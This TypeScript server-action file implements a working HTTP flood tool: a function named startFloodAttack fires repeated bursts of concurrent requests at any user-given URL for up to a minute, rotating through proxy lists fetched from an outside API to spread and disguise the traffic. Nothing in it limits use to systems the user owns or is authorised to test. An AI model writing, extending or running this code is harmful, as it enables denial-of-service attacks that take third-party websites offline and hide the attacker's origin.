
"use server";

import { HttpsProxyAgent } from "https-proxy-agent";

export interface FloodStats {
  totalSent: number;
  successful: number;
  failed: number;
  error?: string;
}

const METHODS_WITHOUT_BODY = ["GET", "HEAD", "DELETE", "OPTIONS"];

export async function startFloodAttack(
  targetUrl: string,
  method: string,
  headersString?: string,
  body?: string,
  concurrency?: number,
  rate?: number,
  durationInSeconds?: number,
  proxiesString?: string
): Promise<FloodStats> {
  let parsedUrl: URL;
  try {
    parsedUrl = new URL(targetUrl);
  } catch (e) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Invalid target URL. Please include scheme (e.g., http:// or https://)." };
  }

  if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
     return { totalSent: 0, successful: 0, failed: 0, error: "Target URL must use http or https protocol." };
  }
  
  const safeConcurrency = Math.min(Math.max(1, concurrency ?? 50), 500); 
  const safeRate = Math.min(Math.max(1, rate ?? 50), 500);
  const safeDuration = Math.min(Math.max(5, durationInSeconds ?? 10), 60);

  if (safeConcurrency <= 0 || safeRate <= 0 || safeDuration <=0) {
    return { totalSent: 0, successful: 0, failed: 0, error: "Concurrency, rate, and duration must be positive values." };
  }

  const parsedHeaders: HeadersInit = {};
  if (headersString) {
    headersString.split('\n').forEach(line => {
      const parts = line.split(':');
      if (parts.length >= 2) {
        const key = parts[0].trim();
        const value = parts.slice(1).join(':').trim();
        if (key && value) {
          parsedHeaders[key] = value;
        }
      }
    });
  }

  const baseFetchOptions: RequestInit = {
    method: method.toUpperCase(),
    headers: parsedHeaders,
    signal: AbortSignal.timeout(5000) 
  };

  if (body && !METHODS_WITHOUT_BODY.includes(method.toUpperCase())) {
    baseFetchOptions.body = body;
    
    if (!parsedHeaders['Content-Type'] && !parsedHeaders['content-type']) {
        try {
            JSON.parse(body);
            parsedHeaders['Content-Type'] = 'application/json';
        } catch (e) {
            parsedHeaders['Content-Type'] = 'text/plain';
        }
        baseFetchOptions.headers = parsedHeaders; 
    }
  }

  let parsedProxies: URL[] = [];
  if (proxiesString) {
    parsedProxies = proxiesString
      .split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0)
      .map(proxyUrlString => {
        try {
          return new URL(proxyUrlString);
        } catch (e) {
          console.warn(`Invalid proxy URL skipped: ${proxyUrlString}`);
          return null;
        }
      })
      .filter(url => url !== null) as URL[];
    if (parsedProxies.length === 0 && proxiesString.trim().length > 0) {
        return { totalSent: 0, successful: 0, failed: 0, error: "No valid proxy URLs provided. Check format (e.g., http://host:port)." };
    }
  }


  let totalSent = 0;
  let successful = 0;
  let failed = 0;
  const startTime = Date.now();
  const endTime = startTime + safeDuration * 1000;

  console.log(`Starting flood: ${method} ${targetUrl}, Concurrency: ${safeConcurrency}, Rate: ${safeRate} RPS, Duration: ${safeDuration}s, Proxies: ${parsedProxies.length}`);

  try {
    while (Date.now() < endTime) {
      const batchStartTime = Date.now();
      const requestsInBatch: Promise<void>[] = [];
      
      const numRequestsThisBurst = safeConcurrency;

      for (let i = 0; i < numRequestsThisBurst; i++) {
        if (Date.now() >= endTime) break;

        let currentFetchOptions = { ...baseFetchOptions };
        if (parsedProxies.length > 0) {
          const proxyUrl = parsedProxies[totalSent % parsedProxies.length];
          try {
            const agent = new HttpsProxyAgent(proxyUrl.toString());
            currentFetchOptions.agent = agent as any; 
          } catch (e) {
            console.error(`Error creating proxy agent for ${proxyUrl}:`, e);
            failed++;
            totalSent++; 
            continue; 
          }
        }

        requestsInBatch.push(
          fetch(targetUrl, currentFetchOptions) 
            .then(response => {
              if (response.ok || (response.status >= 200 && response.status < 400)) {
                successful++;
              } else {
                failed++;
              }
            })
            .catch(() => {
              failed++;
            })
            .finally(() => {
              totalSent++;
            })
        );
      }
      
      await Promise.allSettled(requestsInBatch);

      if (Date.now() >= endTime) break;

      const batchDurationMs = Date.now() - batchStartTime;
      const targetBatchIntervalMs = (numRequestsThisBurst / safeRate) * 1000;
      const delayMs = Math.max(0, targetBatchIntervalMs - batchDurationMs);
      
      if (delayMs > 0) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
      }
    }
  } catch (e: any) {
    console.error("Flood attack error:", e);
    return { totalSent, successful, failed, error: e.message || "An unexpected error occurred during the flood." };
  } finally {
    console.log(`Flood ended: Total Sent: ${totalSent}, Successful: ${successful}, Failed: ${failed}`);
  }

  return { totalSent, successful, failed };
}

export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: string; error?: string }> {
  if (!apiUrl.trim()) {
    return { error: "API URL cannot be empty." };
  }
  try {
    // Basic URL validation
    new URL(apiUrl);
  } catch (e) {
    return { error: "Invalid API URL format. Please include the scheme (e.g., http:// or https://)." };
  }

  try {
    const response = await fetch(apiUrl, { 
      signal: AbortSignal.timeout(10000), // 10 second timeout
      headers: { 'Accept': 'text/plain' } // Prefer plain text
    }); 
    if (!response.ok) {
      return { error: `API request failed with status ${response.status}: ${response.statusText}` };
    }
    const text = await response.text();
    if (!text.trim()) {
      return { error: "API returned an empty proxy list." };
    }
    // Simple validation: check if response looks like a list of IPs or IP:Port
    const lines = text.trim().split('\n');
    if (lines.length === 0 || !lines.some(line => /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$/.test(line.trim()))) {
        // console.warn("Fetched proxy list does not seem to contain valid IP(:Port) formats.", lines.slice(0,5));
        // Allow it for now, but this could be a point of stricter validation
    }
    return { proxies: text.trim() };
  } catch (e: any) {
    console.error("Error fetching proxies from API:", e);
    if (e.name === 'TimeoutError') {
        return { error: "API request timed out." };
    }
    return { error: e.message || "Failed to fetch proxies. Check browser console for more details." };
  }
}
